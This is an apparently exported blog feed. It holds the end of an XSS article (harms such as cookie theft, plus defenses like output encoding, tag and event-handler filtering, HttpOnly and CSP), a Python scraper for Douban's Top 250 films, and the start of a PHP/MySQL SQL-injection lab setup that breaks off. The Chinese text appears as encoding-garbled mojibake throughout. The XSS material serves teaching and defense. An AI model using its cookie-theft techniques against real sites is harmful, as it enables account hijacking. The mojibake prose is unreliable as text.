‡ç­¾åµŒå…¥éšè—çš„æ¶æ„ç½‘ç«™ï¼Œå°†è¢«æ”»å‡»è€…å®šå‘åˆ°æ¶æ„ç½‘ç«™ä¸Šæˆ–ä»¥å¼¹å‡ºæ¶æ„ç½‘ç«™çª—å£ç­‰çš„æ–¹å¼ï¼Œè¿›è¡ŒæŒ‚é©¬ã€‚</li><li><strong>èº«ä»½ç›—ç”¨</strong>ï¼šCookieæ˜¯ç”¨æˆ·å¯¹äºç‰¹å®šç½‘ç«™çš„èº«ä»½éªŒè¯çš„æ ‡å¿—ï¼ŒXSSæ”»å‡»å¯ä»¥ä»¤æ”»å‡»è€…ç›—å–ç”¨æˆ·çš„cookieï¼Œä»è€Œåˆ©ç”¨è¯¥cookieç›—å–ç”¨æˆ·å¯¹è¯¥ç½‘ç«™çš„æ“ä½œæƒé™</li><li><strong>åƒåœ¾ä¿¡æ¯å‘é€</strong>ï¼šåœ¨ç¤¾äº¤ç½‘ç«™ç¤¾åŒºä¸­ï¼Œåˆ©ç”¨XSSæ¼æ´å€Ÿç”¨è¢«æ”»å‡»è€…çš„èº«ä»½å‘é€å¤§é‡çš„åƒåœ¾ä¿¡æ¯ç»™ç‰¹å®šçš„ç›®æ ‡ç¾¤ã€‚</li><li><strong>åŠ«æŒç”¨æˆ·Webè¡Œä¸º</strong>ï¼šä¸€äº›é«˜çº§çš„XSSæ”»å‡»ç”šè‡³å¯ä»¥åŠ«æŒç”¨æˆ·çš„Webè¡Œä¸ºï¼Œä»è€Œç›‘è§†ç”¨æˆ·çš„æµè§ˆå†å²ã€å‘é€ä¸æ¥æ”¶çš„æ•°æ®ç­‰ã€‚</li><li><strong>XSSè •è™«ç—…æ¯’</strong>ï¼šå€ŸåŠ©XSSè •è™«ç—…æ¯’è¿˜å¯ä»¥ç”¨æ¥æ‰“å¹¿å‘Šã€åˆ·æµé‡ã€æŒ‚é©¬ã€æ¶ä½œå‰§ã€ç ´åæ•°æ®ã€å¯¹ç›®æ ‡å®æ–½DDoSæ”»å‡»ç­‰ã€‚</li></ul><p>å­˜å‚¨å‹çš„XSSå±å®³æœ€å¤§ã€‚å› ä¸ºä»–å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ‰€ä»¥ä¸éœ€è¦æˆ‘ä»¬å’Œè¢«æ”»å‡»è€…æœ‰ä»»ä½•æ¥è§¦ï¼Œåªè¦è¢«æ”»å‡»è€…è®¿é—®äº†è¯¥é¡µé¢å°±ä¼šé­å—æ”»å‡»ã€‚è€Œåå°„å‹å’ŒDOMå‹çš„XSSåˆ™éœ€è¦æˆ‘ä»¬å»è¯±ä½¿ç”¨æˆ·ç‚¹å‡»æˆ‘ä»¬æ„é€ çš„æ¶æ„çš„URLï¼Œéœ€è¦æˆ‘ä»¬å’Œç”¨æˆ·æœ‰ç›´æ¥æˆ–è€…é—´æ¥çš„æ¥è§¦ï¼Œæ¯”å¦‚åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦æˆ–è€…åˆ©ç”¨åœ¨å…¶ä»–ç½‘é¡µæŒ‚é©¬çš„æ–¹å¼ã€‚</p><h1 id="XSSçš„é˜²å¾¡"><a href="#XSSçš„é˜²å¾¡" class="headerlink" title="XSSçš„é˜²å¾¡"></a>XSSçš„é˜²å¾¡</h1><p>é€šè¿‡å¯¹ä¸Šé¢å†…å®¹è¿›è¡Œå­¦ä¹ ï¼Œå®¹æ˜“çŸ¥é“ä¸»è¦æ˜¯å‰ç«¯é¡µé¢å®Œå…¨ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥çš„æ•°æ®å¯¼è‡´äº†XSSæ¼æ´å‡ºç°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å‰ç«¯åŠ ä¸Šè¿‡æ»¤ä»£ç ã€è½¬ä¹‰ä»£ç ï¼Œå¯¹ç”¨æˆ·çš„è¾“å…¥(å’ŒURLå‚æ•°)è¿›è¡Œè¿‡æ»¤ï¼Œè¾“å‡ºè¿›è¡Œè½¬ä¹‰ã€‚å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥åˆ†ä¸ºé»‘åå•è¿‡æ»¤å’Œç™½åå•è¿‡æ»¤ã€‚é»‘åå•ï¼šè¿‡æ»¤ç‰¹æ®Šç¬¦å·åŠå­—ç¬¦ï¼Œå¯ä»¥æ‹¦æˆªå¤§éƒ¨åˆ†çš„XSSæ”»å‡»ï¼Œä½†æ˜¯è¿˜æ˜¯å­˜åœ¨è¢«ç»•è¿‡çš„é£é™©ã€‚ç™½åå•ï¼šåªå…è®¸ç‰¹å®šç±»å‹æˆ–å­—ç¬¦ï¼Œå¯ä»¥åŸºæœ¬æœç»XSSæ”»å‡»ï¼Œä½†æ˜¯çœŸå®ç¯å¢ƒä¸­ä¸€èˆ¬æ˜¯ä¸èƒ½è¿›è¡Œå¦‚æ­¤ä¸¥æ ¼çš„ç™½åå•è¿‡æ»¤çš„ã€‚</p><p>å…¶æ¬¡ï¼Œå‡å¦‚æ”»å‡»è€…æœ‰ä¸€å®šå‡ ç‡ç»•è¿‡å‰ç«¯é˜²å¾¡ï¼Œå¯ä»¥å°†cookie æ ‡è®°ä¸º http onlyï¼Œè¿™æ ·çš„è¯å½“æµè§ˆå™¨å‘æœåŠ¡ç«¯å‘èµ·è¯·æ±‚æ—¶å°±ä¼šå¸¦ä¸Š cookie å­—æ®µï¼Œä½†æ˜¯åœ¨è„šæœ¬ä¸­å´ä¸èƒ½è®¿é—® cookieï¼Œè¿™æ ·å°±é¿å…äº† XSS æ”»å‡»åˆ©ç”¨ js çš„ <code>document.cookie</code>è·å– cookieã€‚</p><ul><li>é€šè¿‡ä¸€äº›å‡½æ•°å¯¹åŠ¨æ€è¾“å‡ºåˆ°é¡µé¢çš„å†…å®¹è¿›è¡Œhtmlç¼–ç ï¼Œä½¿å…¶ä¸èƒ½ä½œä¸ºè„šæœ¬è¿è¡Œã€‚å¦‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ä½¿ç”¨htmlspecialcharså‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥çš„nameå‚æ•°è¿›è¡Œhtmlç¼–ç ï¼Œå°†å…¶è½¬æ¢ä¸ºhtmlå®ä½“</span><br><span class="line">$name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨XSS Filter</li></ul><p>é’ˆå¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„éªŒè¯ï¼Œåªæ¥å—æˆ‘ä»¬è§„å®šçš„é•¿åº¦æˆ–å†…å®¹çš„æäº¤ï¼Œè¿‡æ»¤æ‰å…¶ä»–çš„è¾“å…¥å†…å®¹ã€‚æ¯”å¦‚ï¼š</p><ol><li>è¡¨å•æ•°æ®æŒ‡å®šå€¼çš„ç±»å‹ï¼šå¹´é¾„åªèƒ½æ˜¯ int ã€åå­—åªèƒ½æ˜¯å­—æ¯æ•°å­—ç­‰ã€‚</li><li>è¿‡æ»¤æˆ–ç§»é™¤ç‰¹æ®Šçš„ html æ ‡ç­¾ï¼š<code>&lt;script&gt;</code>ã€<code>&lt;iframe&gt;</code>ç­‰ã€‚</li><li>è¿‡æ»¤ js äº‹ä»¶çš„æ ‡ç­¾ï¼š<code>onclick</code>ã€<code>onerror</code>ã€<code>onfocus</code>ç­‰ã€‚</li></ol><ul><li>ç¡®ä¿æ‰§è¡Œè„šæœ¬æ¥æºå¯ä¿¡</li></ul><p>å¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œï¼ˆCSPç­–ç•¥ï¼‰</p><p>æ€»ä¹‹ï¼Œæ€»çš„åŸåˆ™ï¼š<strong>è¾“å…¥åšè¿‡æ»¤ï¼Œè¾“å‡ºåšè½¬ä¹‰</strong></p><ul><li>è¿‡æ»¤ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚è¾“å…¥ç‚¹è¦æ±‚è¾“å…¥æ‰‹æœºå·ï¼Œåˆ™åªå…è®¸è¾“å…¥æ‰‹æœºå·æ ¼å¼çš„æ•°å­—ã€‚</li><li>è½¬ä¹‰ï¼šæ‰€æœ‰è¾“å‡ºåˆ°å‰ç«¯çš„æ•°æ®æ ¹æ®è¾“å‡ºç‚¹è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”å¦‚è¾“å‡ºåˆ°htmlä¸­è¿›è¡Œhtmlå®ä½“è½¬ä¹‰ï¼Œè¾“å…¥åˆ°JSé‡Œé¢è¿›è¡ŒJSè½¬ä¹‰ã€‚</li></ul><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(è·¨ç«™è„šæœ¬)æ¼æ´è¯¦è§£ä¹‹XSSè·¨ç«™è„šæœ¬æ”»å‡»æ¼æ´çš„è§£å†³</a></p><p>[2] <a href="https://mp.weixin.qq.com/s?__biz=MzAwNTAxMjUwNw==&mid=2650265496&idx=1&sn=964f788970cb95a8f78dbdc432cff562&chksm=83205aecb457d3faf7f1f9ea017ae0be6139ecd01c03a4d6f097499f0ea0e934cbac2d28eadf&scene=132#wechat_redirect">å…µä¸´åŸä¸‹ä¸¨è®°ä¸€æ¬¡XSSé¶åœºé€šå…³å®è·µ</a></p><p>[3] <a href="https://my.oschina.net/u/4593189/blog/4418296">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ä»XSSå…¥é—¨åˆ°è¿›é˜¶(é™„Fuzzing+BypassWAF+Payloads)</a></p><p>[4] <a href="https://blog.csdn.net/whoim_i/article/details/102877616">kaliä¹‹beefçš„ä½¿ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¬è™«ç¬¬ä¸€è¯¾</title>
      <link href="posts/12051.html"/>
      <url>posts/12051.html</url>
      
        <content type="html"><![CDATA[<h1 id="çˆ¬è™«åˆè¯†"><a href="#çˆ¬è™«åˆè¯†" class="headerlink" title="çˆ¬è™«åˆè¯†"></a>çˆ¬è™«åˆè¯†</h1><ul><li>ä»€ä¹ˆæ˜¯çˆ¬è™«<br>ç½‘ç»œçˆ¬è™«ï¼Œæ˜¯ä¸€ç§æŒ‰ç…§ä¸€å®šè§„åˆ™ï¼Œè‡ªåŠ¨æŠ“å–äº’è”ç½‘ä¿¡æ¯çš„ç¨‹åºæˆ–è€…è„šæœ¬ã€‚ç”±äºäº’è”ç½‘æ•°æ®çš„å¤šæ ·æ€§å’Œèµ„æºçš„æœ‰é™æ€§ï¼Œæ ¹æ®ç”¨æˆ·éœ€æ±‚å®šå‘æŠ“å–ç›¸å…³ç½‘é¡µå¹¶åˆ†æå·²æˆä¸ºå¦‚ä»Šä¸»æµçš„çˆ¬å–ç­–ç•¥ã€‚</li><li>çˆ¬è™«å¯ä»¥åšä»€ä¹ˆ<br>ä½ å¯ä»¥çˆ¬å–å¦¹å­çš„å›¾ç‰‡ï¼Œçˆ¬å–è‡ªå·±æƒ³çœ‹çš„è§†é¢‘ç­‰ç­‰ï¼Œåªè¦ä½ èƒ½é€šè¿‡æµè§ˆå™¨è®¿é—®çš„æ•°æ®éƒ½å¯ä»¥é€šè¿‡çˆ¬è™«è·å–ã€‚</li><li>çˆ¬è™«çš„æœ¬è´¨æ˜¯ä»€ä¹ˆ<br>æ¨¡æ‹Ÿæµè§ˆå™¨æ‰“å¼€ç½‘é¡µï¼Œè·å–ç½‘é¡µä¸­æˆ‘ä»¬æƒ³è¦çš„é‚£éƒ¨åˆ†æ•°æ®ã€‚</li></ul><h1 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h1><ol><li>å‡†å¤‡å·¥ä½œ<br>é€šè¿‡æµè§ˆå™¨æŸ¥çœ‹åˆ†æç›®æ ‡ç½‘é¡µã€‚</li><li>è·å–æ•°æ®<br>é€šè¿‡requestsåº“å‘ç›®æ ‡ç«™ç‚¹å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚å¯ä»¥åŒ…å«é¢å¤–çš„headerç­‰ä¿¡æ¯ï¼Œå¦‚æœæœåŠ¡å™¨èƒ½æ­£å¸¸å“åº”ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªResponseï¼Œä¾¿æ˜¯æ‰€è¦è·å–çš„é¡µé¢å†…å®¹ã€‚</li><li>è§£æå†…å®¹<br>å¾—åˆ°çš„å†…å®¹å¯èƒ½æ˜¯HTMLã€jsonç­‰æ ¼å¼ï¼Œå¯ä»¥ç”¨é¡µé¢è§£æåº“ã€æ­£åˆ™è¡¨è¾¾å¼ç­‰è¿›è¡Œè§£æã€‚</li><li>ä¿å­˜æ•°æ®<br>ä¿å­˜å½¢å¼å¤šæ ·ï¼Œå¯ä»¥å­˜ä¸ºæ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥ä¿å­˜åˆ°æ•°æ®åº“ï¼Œæˆ–è€…ä¿å­˜ç‰¹å®šæ ¼å¼çš„æ–‡ä»¶ã€‚</li></ol><h1 id="çˆ¬è™«ç¬¬ä¸€è¯¾"><a href="#çˆ¬è™«ç¬¬ä¸€è¯¾" class="headerlink" title="çˆ¬è™«ç¬¬ä¸€è¯¾"></a>çˆ¬è™«ç¬¬ä¸€è¯¾</h1><blockquote><p>è¿™é‡Œä½¿ç”¨requestsæ¨¡å—å’ŒBeautifulSoupæ¨¡å—</p><p>çˆ¬å–å†…å®¹ä¸ºï¼šè±†ç“£top250ç”µå½±çš„åå­—ã€ç®€ä»‹ã€è¯„åˆ†åŠè¯„åˆ†äººæ•°ã€‚</p></blockquote><h2 id="æŸ¥æ‰¾ä¿¡æ¯"><a href="#æŸ¥æ‰¾ä¿¡æ¯" class="headerlink" title="æŸ¥æ‰¾ä¿¡æ¯"></a>æŸ¥æ‰¾ä¿¡æ¯</h2><p>è¿›å…¥<a href="https://movie.douban.com/top250?start=0">è±†ç“£ç”µå½±Top250</a>ï¼ŒF12å®¡æŸ¥å…ƒç´ ï¼Œæ‰¾åˆ°æ‰€è¦çˆ¬å–çš„ä¿¡æ¯éƒ½åœ¨æ ‡ç­¾ <code>&lt;div class=&quot;info&quot;&gt;</code> ä¸­é—´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/4fbThzNRHkCJm2t.png" alt="image-20210314143734029"></p><p><strong>URLï¼š</strong></p><p><a href="https://movie.douban.com/top250?start=0">https://movie.douban.com/top250?start=0</a></p><p>åé¢åˆ†åˆ«ä¸ºï¼šstrat=25ï¼Œ50â€¦åˆ†åˆ«å¯¹åº”å‰25éƒ¨ã€26 ~ 50éƒ¨ã€51 ~ 75éƒ¨â€¦ç”µå½±çš„ä¿¡æ¯ã€‚</p><p><strong>User-Agent:</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145348886.png" alt="image-20210314145348886"></p><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_movies</span>():</span></span><br><span class="line">    <span class="comment"># æ·»åŠ header</span></span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># åˆ›å»ºå­˜å‚¨ä¿¡æ¯çš„åˆ—è¡¨</span></span><br><span class="line">    movie_title=[]</span><br><span class="line">    movie_other=[]</span><br><span class="line">    movie_info=[]</span><br><span class="line">    movie_fen=[]</span><br><span class="line">    movie_num=[]</span><br><span class="line">    <span class="comment"># éå†æ¯ä¸ªé¡µé¢é“¾æ¥å¹¶å‘å‡ºGETè¯·æ±‚</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        link=<span class="string">&#x27;https://movie.douban.com/top250?start=&#x27;</span>+<span class="built_in">str</span>(i*<span class="number">25</span>)</span><br><span class="line">        r=requests.get(link,headers=headers)</span><br><span class="line">        print(<span class="string">&#x27;å·²è·å–ç¬¬&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">1</span>),<span class="string">&#x27;åˆ°&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">25</span>),<span class="string">&#x27;éƒ¨ç”µå½±ä¿¡æ¯ã€‚&#x27;</span>)</span><br><span class="line">        <span class="comment"># è·å–ç”µå½±ä¿¡æ¯</span></span><br><span class="line">        soup=BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;title&#x27;</span>).get_text()</span><br><span class="line">            movie_title.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;other&#x27;</span>).get_text()</span><br><span class="line">            movie_other.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;info&#x27;</span>):</span><br><span class="line">            info = t.find(<span class="string">&#x27;p&#x27;</span>).get_text().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            movie_info.append(info)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            fen = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;rating_num&#x27;</span>).get_text()</span><br><span class="line">            movie_fen.append(fen)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>,<span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            num = t.find_all(<span class="string">&#x27;span&#x27;</span>)[<span class="number">3</span>].get_text()</span><br><span class="line">            movie_num.append(num)</span><br><span class="line">    <span class="keyword">return</span> movie_title,movie_other,movie_info,movie_fen,movie_num</span><br><span class="line"></span><br><span class="line">a,b,c,d,e=get_movies()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">import</span> codecs</span><br><span class="line">    <span class="comment"># å°†è·å–ä¿¡æ¯å†™å…¥TXTæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;c:\\Users\\32662\\Desktop\\douban.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&#x27;è±†ç“£ç”µå½± Top 250\n\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">250</span>):</span><br><span class="line">                f.write(<span class="string">&#x27;Top&#x27;</span>+<span class="built_in">str</span>(n+<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">&#x27;ç”µå½±åï¼š&#x27;</span>+a[n]+b[n]+c[n]+<span class="string">&#x27;è±†ç“£è¯„åˆ†&#x27;</span>+d[n]+<span class="string">&#x27; &#x27;</span>+e[n])</span><br><span class="line">                f.write(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="æ‰§è¡Œç»“æœ"><a href="#æ‰§è¡Œç»“æœ" class="headerlink" title="æ‰§è¡Œç»“æœ"></a>æ‰§è¡Œç»“æœ</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145621481.png" alt="image-20210314145621481"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145657377.png" alt="image-20210314145657377"></p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™</title>
      <link href="posts/33159.html"/>
      <url>posts/33159.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>æµ‹è¯•ç¯å¢ƒï¼š</p><p>Apache2.4</p><p>php7.4</p><p>MySQL8.0.22</p></blockquote><h1 id="PHP-MySQL"><a href="#PHP-MySQL" class="headerlink" title="PHP + MySQL"></a>PHP + MySQL</h1><p>é€šè¿‡PHP å¯ä»¥æ“ä½œMySQLä¸­çš„æ•°æ®ï¼Œä½†é¦–å…ˆéœ€è¦è§£å†³çš„é—®é¢˜æ˜¯PHPå¦‚ä½•è¿æ¥åˆ°MySQL?</p><p>æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼š</p><ul><li>MySQLi (é¢å‘å¯¹è±¡)</li><li>MySQLi (é¢å‘è¿‡ç¨‹)</li><li>PDO(PHP Data Objects)</li></ul><p>åŒºåˆ«åœ¨äºï¼šPDO åº”ç”¨åœ¨ 12 ç§ä¸åŒæ•°æ®åº“ä¸­ï¼Œ MySQLi åªé’ˆå¯¹ MySQL æ•°æ®åº“ã€‚</p><p>MySQLi å’Œ PDOåœ¨PHPå®‰è£…æ—¶å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯è‡ªåŠ¨å®‰è£…çš„ï¼Œå¯èƒ½éœ€è¦åšçš„æ˜¯åœ¨PHPé…ç½®æ–‡ä»¶ <code>php.ini</code>ä¸­å¼€å¯ç›¸åº”æ¨¡å—ï¼ˆå»æ‰å‰é¢çš„åˆ†å·ï¼‰ï¼Œå®‰è£…æƒ…å†µå¯é€šè¿‡<code>phpinfo()</code>è¿›è¡ŒæŸ¥çœ‹ã€‚</p><p>ä¿®æ”¹<code>php.ini</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306205054865.png"></p><p>é€šè¿‡<code>phpinfo()</code> æŸ¥çœ‹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204317682.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204242649.png"></p><p><strong>ä¸‰ç§è¿æ¥æ–¹å¼ç¤ºä¾‹ï¼š</strong></p><p>MySQLi (é¢å‘å¯¹è±¡)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>MySQLi (é¢å‘è¿‡ç¨‹)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PDO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>;&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 